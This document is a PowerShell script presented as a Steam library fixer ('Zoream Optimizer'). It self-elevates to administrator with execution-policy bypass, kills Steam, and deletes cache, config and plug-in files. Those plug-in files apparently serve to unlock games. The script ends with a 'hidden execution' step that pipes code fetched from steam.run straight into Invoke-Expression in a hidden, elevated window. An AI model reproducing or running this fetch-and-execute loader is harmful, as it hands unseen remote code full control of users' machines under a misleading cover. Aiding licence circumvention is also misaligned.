# -------------------- 0. CONSOLE PREP & ANTI-FREEZE --------------------
try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
} catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

# -------------------- 1. ADMIN CHECK --------------------
$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

# -------------------- 2. UI HELPERS --------------------
function Show-Header {
    Write-Host " "
    Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
    Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
    Write-Host "     ███╔╝ ██║   ██║██████╔╝█████╗  ███████║██╔████╔██║" -ForegroundColor DarkCyan
    Write-Host "    ███╔╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║" -ForegroundColor Blue
    Write-Host "   ███████╗╚██████╔╝██║  ██║███████╗██║  ██║██║ ╚═╝ ██║" -ForegroundColor Blue
    Write-Host "   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝" -ForegroundColor DarkBlue
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR"   { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

# -------------------- 3. MAIN LOGIC --------------------
Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"

# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }


# Reset Steam Beta & Terminate
Write-Log "Resetting Steam & Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 2
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

# Cache Cleaning
$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
if (Test-Path (Join-Path $steamPath "appcache")) {
    Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
}

# --- PLUGIN VALIDATION & AUTO-CLEAN ---
Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
$stpluginPath = Join-Path $steamPath "config\stplug-in"

if (-not (Test-Path $stpluginPath)) {
    Write-Log "stplug-in folder does not exist!" "WARN"
} else {
    # 1. Non-Lua File Cleanup
    Get-ChildItem $stpluginPath -File | ForEach-Object {
        if ($_.Extension -ne ".lua") {
            Write-Log "Removing non-lua file: $($_.Name)" "ERROR"
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }

    # Validation Function
    function Test-ValidLuaLine {
        param([string]$Line)
        $trimmed = $Line.Trim()
        if ([string]::IsNullOrWhiteSpace($trimmed) -or $trimmed.StartsWith('-')) { return $true }
        if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
            if ($trimmed -match '\(' -and $trimmed -match '\)') { return $true }
        }
        return $false
    }

    # 2. Invalid Lua Content Cleanup
    Get-ChildItem $stpluginPath -Filter "*.lua" | ForEach-Object {
        $lines = Get-Content $_.FullName
        $isClean = $true
        foreach ($l in $lines) {
            if (-not (Test-ValidLuaLine $l)) { 
                $isClean = $false
                break 
            }
        }
        
        if ($isClean) { 
            Write-Log "Validated: $($_.Name)" "SUCCESS" 
        } else { 
            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR" 
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

# Delete steam.cfg
Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

# -------------------- 4. FINAL & HIDDEN EXECUTION --------------------

Write-Log "Fix & Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   >>> CORE EXECUTING IN BACKGROUND <<<" -ForegroundColor Cyan
Write-Host " "

# Background Execute steam.run
$command = "irm steam.run | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

# Geri Sayım
for ($i = 5; $i -gt 0; $i--) {
    Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
